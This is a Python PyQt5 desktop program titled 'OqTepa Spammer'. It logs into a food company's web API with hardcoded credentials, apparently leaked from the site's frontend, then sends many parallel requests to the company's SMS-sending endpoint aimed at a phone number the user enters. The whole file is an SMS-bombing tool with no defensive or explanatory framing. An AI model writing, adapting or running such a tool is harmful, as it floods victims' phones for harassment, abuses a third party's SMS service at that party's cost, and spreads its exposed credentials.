import sys

import requests

from icon import ICON

from PyQt5.QtCore import Q_ARG, QMetaObject, QRunnable, QByteArray, Qt, QThreadPool
from PyQt5.QtGui import QCloseEvent, QIcon, QPixmap
from PyQt5.QtWidgets import (
    QApplication, QLabel, QLineEdit, QMainWindow,
    QPushButton, QTextEdit, QVBoxLayout, QWidget
)


def icon_from_base64(icon):
    pixmap = QPixmap()
    pixmap.loadFromData(QByteArray.fromBase64(icon))
    return QIcon(pixmap)


class OqtepaSpammerApp(QMainWindow):
    def __init__(self):
        self.token = self.get_token()
        self.headers = {
            'accept': 'application/json',
            'authorization': f'Bearer {self.token}',
            'content-type': 'application/json; charset=utf-8'
        }
        self.number = None
        super().__init__()

        self.setWindowIcon(icon_from_base64(ICON))
        self.setWindowTitle("OqTepa Spammer")
        self.setFixedSize(400, 400)

        self.central_widget = QWidget(self)
        self.setCentralWidget(self.central_widget)

        self.layout = QVBoxLayout(self.central_widget)

        self.phone_label = QLabel("Phone Number:", self.central_widget)
        self.layout.addWidget(self.phone_label)

        self.phone_input = QLineEdit(self.central_widget)
        self.phone_input.setText("998")
        self.layout.addWidget(self.phone_input)

        self.threads_label = QLabel("Number of Threads:", self.central_widget)
        self.layout.addWidget(self.threads_label)

        self.threads_input = QLineEdit(self.central_widget)
        self.threads_input.setText("10")
        self.layout.addWidget(self.threads_input)

        self.submit_button = QPushButton("Spam", self.central_widget)
        self.layout.addWidget(self.submit_button)
        self.submit_button.clicked.connect(self.start_spamming)

        self.log_label = QLabel("Log:", self.central_widget)
        self.layout.addWidget(self.log_label)

        self.log_textarea = QTextEdit(self.central_widget)
        self.layout.addWidget(self.log_textarea)

        self.thread_pool = QThreadPool()
        self.thread_pool.setMaxThreadCount(100)

    def start_spamming(self):
        self.number = self.phone_input.text()
        threads = self.threads_input.text()
        n = int(threads if threads.isdigit() else 1)

        for _ in range(n):
            task = SpammerTask(self.headers, self.number, self.log_textarea)
            self.thread_pool.start(task)

    def get_token(self) -> str:
        url = 'https://cc.oqtepalavash.uz/api/account/token'
        data = {"userName": "web", "password": "webP@ssw0rd"}
        res = requests.post(url, json=data)
        return res.json()['token']

    def closeEvent(self, event: QCloseEvent):
        self.thread_pool.clear()
        event.accept()


class SpammerTask(QRunnable):
    def __init__(self, headers, number, log_textarea):
        super().__init__()
        self.number = number
        self.headers = headers
        self.log_textarea = log_textarea

    def run(self):
        json_data = {'phone': self.number, 'language': 1}
        url = 'https://cc.oqtepalavash.uz/api/sms/Send'
        response = requests.post(url, headers=self.headers, json=json_data)

        self.append_log(log=f"Log: {response.json()}")

    def append_log(self, log: str):
        try:
            QMetaObject.invokeMethod(
                self.log_textarea, "append",
                Qt.ConnectionType.QueuedConnection,
                Q_ARG(str, log)
            )
        except:
            pass


if __name__ == "__main__":
    app = QApplication(sys.argv)

    phone_spam_app = OqtepaSpammerApp()
    phone_spam_app.show()

    sys.exit(app.exec_())
